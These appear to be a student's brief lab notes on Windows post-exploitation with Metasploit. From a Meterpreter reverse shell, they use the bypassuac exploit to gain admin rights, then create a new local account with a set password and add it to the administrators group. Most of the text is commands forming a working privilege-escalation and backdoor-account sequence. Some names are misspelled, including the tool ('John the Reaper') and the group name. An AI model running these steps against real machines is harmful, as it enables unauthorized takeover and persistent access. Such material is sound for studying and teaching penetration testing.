# Password Cracking
### 3/30/2022

 * Options: John the Reaper or Crack the Password
 * Mst always have a valid reverse shell connection
 * Inorder to get the password we need the hash

* get to the point of "exploit" with the reverseshell session with meterpreter
* hashes associated with the user are LM Hash (this is old and weak) or NtLM hash (this is newer and stronger)

`
background
sessions
search bypassuac
`

Use the `use` command to apply the first given location

`
use exploit/windows/local/bypassuac
set session 1
show options
exploit
`

Now with this session, we have admin privilages
* anything with admin privilages is able to save in a system protected folder ('System32')

`
net user
shell
`

Want to be in the System 32 folder because it means you are an admin

`
net user /add Kristiana passWoRd
net localgroup administrator Kristiana /add
`
// adds administrators privilages to the account create
